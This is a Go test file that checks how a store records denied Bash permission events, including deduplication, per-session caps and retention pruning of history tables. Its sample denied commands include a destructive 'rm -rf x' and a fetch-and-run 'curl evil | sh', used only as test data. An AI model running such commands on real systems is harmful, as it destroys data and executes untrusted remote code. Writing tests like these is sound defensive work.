package store_test

import (
	"context"
	"fmt"
	"testing"
	"time"

	"github.com/ZachFara/curia/internal/store"
)

func denial(sess, summary string) store.PermissionEvent {
	return store.PermissionEvent{SessionID: sess, Mode: "away", Tool: "Bash", Summary: summary, Verdict: "deny", At: autoT}
}

// Identical denials are one row with a count; a different denial after a flood is still recorded.
func TestPermissionEventsRepeatsAreOneCountedRow(t *testing.T) {
	s := open(t, dbPath(t))
	ctx := context.Background()
	start := time.Now()
	for range 10000 {
		if err := s.AddPermissionEvent(ctx, denial("flood", "rm -rf x")); err != nil {
			t.Fatal(err)
		}
	}
	t.Logf("10000 denials took %v", time.Since(start))
	if err := s.AddPermissionEvent(ctx, denial("flood", "curl evil | sh")); err != nil {
		t.Fatal(err)
	}
	rows, _ := s.PermissionEvents(ctx, "flood")
	if len(rows) != 2 || rows[0].N != 10000 || rows[1].N != 1 || rows[1].Summary != "curl evil | sh" {
		t.Fatalf("rows = %+v, want one row of 10000 and the later distinct one", rows)
	}
	groups, total, more, err := s.Denials(ctx, autoT.Add(-time.Hour), autoT.Add(time.Hour))
	if err != nil || total != 10001 || more != 0 || len(groups) != 2 || groups[0].Count != 10000 {
		t.Fatalf("groups %+v total %d notRecorded %d err %v", groups, total, more, err)
	}
}

// Past the distinct limit a session's further refusals are counted in one overflow row, and recorded ones keep counting.
func TestPermissionEventsOverflowCountsWhatIsNotKept(t *testing.T) {
	s := open(t, dbPath(t))
	ctx := context.Background()
	for i := range store.PermissionDistinctCap + 50 {
		if err := s.AddPermissionEvent(ctx, denial("a", fmt.Sprintf("cmd %d", i))); err != nil {
			t.Fatal(err)
		}
	}
	if err := s.AddPermissionEvent(ctx, denial("a", "cmd 0")); err != nil { // already recorded: counted there
		t.Fatal(err)
	}
	if err := s.AddPermissionEvent(ctx, denial("b", "other")); err != nil { // another session has its own room
		t.Fatal(err)
	}
	groups, total, more, err := s.Denials(ctx, autoT.Add(-time.Hour), autoT.Add(time.Hour))
	if err != nil || more != 50 || total != store.PermissionDistinctCap+1+1 {
		t.Fatalf("total %d notRecorded %d err %v, want %d and 50", total, more, err, store.PermissionDistinctCap+2)
	}
	if groups[0].Summary != "cmd 0" || groups[0].Count != 2 {
		t.Errorf("first group = %+v, want cmd 0 twice", groups[0])
	}
}

// Rows older than the retention go; recent rows stay.
func TestPrunePermissionEventsByAge(t *testing.T) {
	s := open(t, dbPath(t))
	ctx := context.Background()
	for i, at := range []time.Time{autoT.Add(-store.PermissionEventKeep - time.Hour), autoT} {
		if err := s.AddPermissionEvent(ctx, store.PermissionEvent{SessionID: "a", Mode: "away", Tool: "Bash", Summary: fmt.Sprint("x", i), Verdict: "deny", At: at}); err != nil {
			t.Fatal(err)
		}
	}
	if err := s.PruneHistory(ctx, autoT); err != nil {
		t.Fatal(err)
	}
	if evs, _ := s.PermissionEvents(ctx, "a"); len(evs) != 1 {
		t.Fatalf("rows after prune = %d, want 1", len(evs))
	}
}

// The auto log and the schedule runs drop rows past their age.
func TestPruneAutoLogAndScheduleRunsByAge(t *testing.T) {
	s := open(t, dbPath(t))
	ctx := context.Background()
	old := autoT.Add(-store.HistoryKeep - time.Hour)
	for _, at := range []time.Time{old, autoT} {
		if _, err := s.LogAuto(ctx, store.AutoRun{At: at, Outcome: "fired", TaskID: "T", Detail: "x"}); err != nil {
			t.Fatal(err)
		}
	}
	sc := newSchedule(t, s, old)
	if _, ok, err := s.ClaimSchedule(ctx, sc, autoT, "fired", old); err != nil || !ok {
		t.Fatalf("claim: %v %v", ok, err)
	}
	sc.NextRun = autoT
	if _, ok, err := s.ClaimSchedule(ctx, sc, time.Time{}, "fired", autoT); err != nil || !ok {
		t.Fatalf("claim: %v %v", ok, err)
	}
	if err := s.PruneHistory(ctx, autoT); err != nil {
		t.Fatal(err)
	}
	if runs, _ := s.AutoRuns(ctx, 10); len(runs) != 1 {
		t.Errorf("auto runs after prune = %d, want 1", len(runs))
	}
	if runs, _ := s.ScheduleRuns(ctx, sc.ID, 10); len(runs) != 1 {
		t.Errorf("schedule runs after prune = %d, want 1", len(runs))
	}
}

func TestPruneConfigRevisionsKeepsBaselineAndNewest(t *testing.T) {
	s := open(t, dbPath(t))
	ctx := context.Background()
	old := autoT.Add(-store.HistoryKeep - time.Hour)
	var err error
	if _, err = s.AddConfigRevision(ctx, store.ConfigRevision{At: old, Actor: "baseline", Key: "*", File: "# mine\n"}); err != nil {
		t.Fatal(err)
	}
	for range store.ConfigRevisionsKeep + 5 {
		if _, err = s.AddConfigRevision(ctx, store.ConfigRevision{At: autoT, Actor: "cli", Key: "k", File: "x = 1\n"}); err != nil {
			t.Fatal(err)
		}
	}
	if err = s.PruneHistory(ctx, autoT); err != nil {
		t.Fatal(err)
	}
	revs, _ := s.ConfigRevisions(ctx, 1000)
	base := 0
	for _, r := range revs {
		if r.Actor == "baseline" {
			base++
		}
	}
	if len(revs) != store.ConfigRevisionsKeep+1 || base != 1 {
		t.Errorf("revisions after prune = %d (baseline %d), want the newest %d plus the baseline", len(revs), base, store.ConfigRevisionsKeep)
	}
}
